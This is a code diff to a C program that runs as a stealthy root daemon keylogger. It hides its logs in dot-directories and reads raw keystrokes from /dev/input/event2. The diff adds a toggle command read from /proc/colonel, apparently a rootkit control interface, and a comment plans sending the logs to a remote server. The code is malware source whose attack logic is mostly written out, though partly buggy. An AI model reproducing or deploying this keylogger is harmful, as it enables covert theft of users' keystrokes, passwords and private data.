@@ -11,14 +11,23 @@
 #include <time.h>
 #include <fcntl.h>
 
+// #define MAX(a,b) \
+//    ({ typeof (a) _a = (a); \
+//       typeof (b) _b = (b); \
+//      _a < _b ? _a : _b; })		/* typesafe macro for retrieving the max value */
+
 
 int main(void) {
 	FILE *fp = NULL;
 	FILE *evlog;
+	FILE *ftty;
 	struct utsname unameData;
 	uname(&unameData);
 	int fd;
 	int dir;
+	char listening = 0;
+	char cmd[10];
+	// struct proc_dir_entry *col_cmd;
 	struct input_event ev;			/* using input_event so we know 
 									 * what we're reading from the 
 									 * event file */
@@ -50,17 +59,22 @@ int main(void) {
 	close(STDOUT_FILENO);
 	close(STDERR_FILENO);
 
+	time_t curtime;
+	time(&curtime);
 	dir = mkdir("./.log", S_IRWXU);				/* log directory */
 	fp = fopen("./.log/.log.txt", "a+"); 		/* daemon log */
 	evlog = fopen("./.log/.evlog.txt", "a+");  	/* key log */
 	fd = open("/dev/input/event2", O_RDONLY);	/* key event file */
+	ftty = fopen("/proc/colonel","r");			/* will act as pseudo terminal */
+	if (!ftty) {
+		fprintf(fp, "%s -- ERROR: /proc/colonel not found", ctime(&curtime));
+		return 1;
+	}
 	// findev = open('/proc/bus/input/devices', O_RDONLY);
 /*
 * DYNAMICALLY DISCOVER CORRECT EVENT (/proc/bus/input/devices) 327
 * Send file out via libcurl to python server for translation
 */
-	time_t curtime;
-	time(&curtime);
 	if (geteuid() != 0) {							/* check if user is root */
 		fprintf(fp, "%s -- ERROR: user not root\n", ctime(&curtime));
 		return 1;
@@ -76,10 +90,37 @@ int main(void) {
 			unameData.sysname, unameData.release, 
 			unameData.machine);
 
+
+
+	while(1) {
+		fgets(cmd, sizeof(cmd), ftty);
+		// int len = strlen(cmd) -1;
+		// if ('\n' == cmd[len]) {			/* strips newline */
+		// 	cmd[len] = 0;
+		// }
+		if (!strncmp(cmd, "toglis", sizeof(strlen(cmd)))) {
+			listening = !listening;
+		}
+	}
+
+
+
+	// read(ftty, &col_cmd, sizeof(struct proc_dir_entry));
+	// if ("toglis" == col_cmd.)
+
+
+// int write_colonel(struct file *file, const char __user *buff, unsigned long count, void *data) {
+// 		if (!strncmp(buff, "toglis", MAX(6, count))) {		/*toggles listening -- turn the keylogger on/off */
+// 			listening = !listening;
+		
+// 	    return count;
+// 	}
+
+
 	while(1) {
 		fflush(fp);
 		read(fd, &ev, sizeof(struct input_event));
-		if(1 == ev.type) {
+		if(1 == ev.type && listening) {
 			fprintf(evlog, "%i,%i-", ev.code, ev.value);
 			fflush(evlog);
 		}
